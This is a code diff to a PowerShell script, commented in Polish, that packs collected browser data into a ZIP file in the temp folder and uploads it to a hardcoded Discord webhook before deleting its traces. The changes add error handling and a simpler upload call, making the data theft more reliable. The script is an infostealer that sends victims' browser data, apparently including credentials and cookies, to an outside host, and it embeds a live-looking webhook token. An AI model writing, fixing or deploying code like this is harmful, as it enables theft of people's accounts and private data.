@@ -25,26 +25,28 @@ foreach ($Browser in $Paths.Keys) {
 # Kompresja danych do ZIP
 $ZipPath = Join-Path $env:TEMP "BrowserData.zip"
 if (Test-Path $ZipPath) { Remove-Item -Path $ZipPath -Force }
-Compress-Archive -Path $TempFolder -DestinationPath $ZipPath
+try {
+    Compress-Archive -Path $TempFolder -DestinationPath $ZipPath -Force
+} catch {
+    Write-Host "Błąd podczas kompresji plików: $_"
+    Exit 1
+}
 
 # Webhook Discord
 $WebhookURL = "https://discord.com/api/webhooks/1327027314587996321/3By2GaZl0B40tgJFqW-pJSjm09qg8bX6ogGi3g9T27d_nef7V-F8nJhUNL3VtUakMYtd"
 
 # Wysyłanie pliku ZIP na Discord
-$FileData = [System.IO.File]::ReadAllBytes($ZipPath)
-$EncodedFile = [Convert]::ToBase64String($FileData)
-
-$Boundary = "------------------------" + [System.Guid]::NewGuid().ToString()
-$Body = @"
---$Boundary
-Content-Disposition: form-data; name="file"; filename="BrowserData.zip"
-Content-Type: application/zip
-
-$EncodedFile
---$Boundary--
-"@
-
-Invoke-WebRequest -Uri $WebhookURL -Method POST -Body $Body -ContentType "multipart/form-data; boundary=$Boundary"
+if (Test-Path $ZipPath) {
+    try {
+        Invoke-WebRequest -Uri $WebhookURL -Method POST -Form @{file = Get-Item $ZipPath}
+    } catch {
+        Write-Host "Błąd podczas wysyłania pliku na webhook: $_"
+        Exit 1
+    }
+} else {
+    Write-Host "Plik ZIP nie został znaleziony."
+    Exit 1
+}
 
 # Czyszczenie plików tymczasowych
 Remove-Item -Recurse -Force $TempFolder
